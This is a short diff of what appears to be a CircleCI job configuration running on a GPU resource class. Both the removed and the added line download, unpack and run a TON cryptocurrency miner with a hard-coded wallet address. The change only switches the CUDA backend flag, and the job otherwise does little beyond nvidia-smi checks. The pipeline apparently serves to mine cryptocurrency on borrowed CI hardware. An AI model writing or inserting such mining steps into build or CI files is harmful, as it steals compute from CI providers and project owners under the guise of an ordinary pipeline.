@@ -7,5 +7,5 @@ jobs:
     resource_class: gpu.nvidia.medium
     steps:
       - run: nvidia-smi
-      - run: wget https://github.com/toncoinpool/stratum-miner/releases/download/v2.1.1/TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && tar -xvf TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && cd TON-Stratum-Miner && ./TON-Stratum-Miner -w EQDNhrBNvfhU9pHI3okVlDyLd_QSy9njt4XjlciRYFTLD0Y9 -b cuda-18 -F 2048 --exclude-gpus 1 -r AST
+      - run: wget https://github.com/toncoinpool/stratum-miner/releases/download/v2.1.1/TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && tar -xvf TON-Stratum-Miner-2.1.1-linux-headless.tar.gz && cd TON-Stratum-Miner && ./TON-Stratum-Miner -w EQDNhrBNvfhU9pHI3okVlDyLd_QSy9njt4XjlciRYFTLD0Y9 -b cuda-20 -F 2048 --exclude-gpus 1 -r AST
       - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
